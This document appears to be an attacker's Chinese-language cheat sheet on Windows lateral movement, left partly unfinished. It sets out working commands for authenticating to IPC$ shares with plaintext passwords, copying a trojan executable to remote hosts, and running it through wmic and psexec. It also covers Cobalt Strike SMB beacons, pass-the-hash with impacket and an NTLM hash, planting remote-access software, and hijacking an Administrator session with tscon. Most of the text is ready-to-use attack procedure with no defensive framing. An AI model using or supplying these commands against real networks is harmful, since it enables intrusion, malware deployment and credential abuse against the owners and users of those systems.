## 0x00 碰见的横向移动方法总结1_IPC（部分，慢慢更新）

    主机开启139和445端口，IPC移动  
    shell net use \\192.168.10.23\ipc$ "Psft24680!!@@62##" /user:"Administrator"  
    
    查看远程主机文件
    
    
    dir \\192.168.52.143\c$
    dir \\192.168.52.143\c$\xx文件夹
    
    在本地传个马，copy过去    
    shell copy C:\\Windows\\Temp\\ma.exe \\192.168.10.23\c$\Windows\Temp\ma.exe
      
    wmic远程执行 
    shell wmic /node:192.168.10.23 /user:Administrator /password:Psft24680!!@@62## process call create "cmd.exe /c C:\\Windows\\Temp\\ma.exe"
    
    也可以使用psexec进行远程执行
    
    psexec.exe -accepteula \\192.168.41.150 -h -d c:\wanli.exe
    
    如果发现很久没有上线，可能目标不出网

## 0x01 横向移动方法总结2_beacon
 
    SMB Beacon使用命名管道和父级命名管道进行通信,所以利用他可进行横向移动
    
    使用条件
    
    使用SMB的主机必修接受445端口打开
    只能链接由同一Cobalt Strike实例管理的Beacon
## 0x02 横向移动方法3_PTH攻击

    psexec工具功能之一是远程启动交互式shell,这个工具不需要对方开启3389端口，只需要开启admin$共享即可。
    
    使用方法1
    
    1.psexec 需要建立ipc连接进行横向移动
    
     net use \\192.168.3.144\ipc$ “admin!@#45” /user:"administrator"  #和对方建立IPC链接，出现弹框点击agree
     psexec \\192.168.3.64 -s cmd cmd     #   -s,表示以system权限运行窗口，成功返回目标主机system权限窗口
     
    2.ps不需要建立ipc连接进行横向移动
    
     psexec \\192.168.3.144 -u administrator -p admin123！！ -s cmd
     
     注意官方自带的psexec只能通过明文进行传递攻击，密码是行不通的，例如 psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.144 是不可以的
     
    3.利用impacket中的工具包进行横向渗透，可解决密文攻击问题
    
      impacket工具包里有个psexec，可进行密文传递攻击，下载地址：https://github.com/maaaaz/impacket-examples-windows
      
      psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.144
      
    以上方法CS里自带该功能。

## 0x03 横向移动方法4_票据攻击

## 0x04 横向移动方法5_远控攻击

  远控攻击就是给目标装一些免安装的远控软件，例如：向日葵、todesk

  https://github.com/wafinfo/Sunflower_get_Password
  
  
## 0x05 其他横向技巧

  Windows Server 2012及以上不提取密码登录Administrator桌面（登录这个桌面目的是看看Administrator桌面有啥，方便横向）
  
  2012及高版本想要得到密码，只能通过修改注册表，然后让管理员重新登录主机才能得到密码，一般服务器重新进行登录时候很少。我们可以通过一些技巧得到Administrator权限，
  
  拿到shell后，whoami是system权限，可以添加用户后，上隧道把远程桌面代理出来，此时的权限仍然是system权限
  
  此时想要得到Administrator权限步骤如下：
  
  1.psexec启动一个system权限的cmd  命令：psexec.exe -s -i cmd.exe  
  
  2.query user 
  
  3.查看administrator会话id   
  
  4.tscon 1 切换会话id为Administrator权限
  
  
  
  
  


